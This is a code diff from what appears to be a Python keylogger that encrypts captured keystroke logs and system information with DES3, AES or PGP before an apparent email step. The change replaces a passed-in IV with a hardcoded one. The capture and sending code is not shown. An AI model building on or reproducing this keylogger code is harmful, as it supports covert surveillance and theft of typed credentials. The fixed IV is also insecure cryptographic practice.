@@ -223,7 +223,7 @@ while currentTime < endTime:
 # PGP encryption
 
 # encrypt files
-def encryptions(key, name, email, system, keylogger,iv):
+def encryptions(key, name, email, system, keylogger):
     systemfiles_to_encrypt = [extendedPath + systemInfo]
     keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
     systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
@@ -232,7 +232,7 @@ def encryptions(key, name, email, system, keylogger,iv):
     if system:
         for encryptingFile in systemfiles_to_encrypt:
             if name == "DES3":
-                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile,iv)
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
             if name == "AES":
                 systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
             if name == "PGP":
@@ -244,7 +244,7 @@ def encryptions(key, name, email, system, keylogger,iv):
     if keylogger:
         for encryptingFile in keyloggerfiles_to_encrypt:
             if name == "DES3":
-                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile, iv)
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
             if name == "AES":
                 systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
             if name == "PGP":
@@ -262,7 +262,8 @@ def encryptions(key, name, email, system, keylogger,iv):
 # des3 encryption
 
 # encrypt files
-def des3_encrypt(key, filelist_encrypt,iv):
+def des3_encrypt(key, filelist_encrypt):
+    iv = b'\xc3\xd0\xb9\x82\xe7\x902\xe4'
     with open(filelist_encrypt, 'rb') as f:
         data = f.read()
     cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
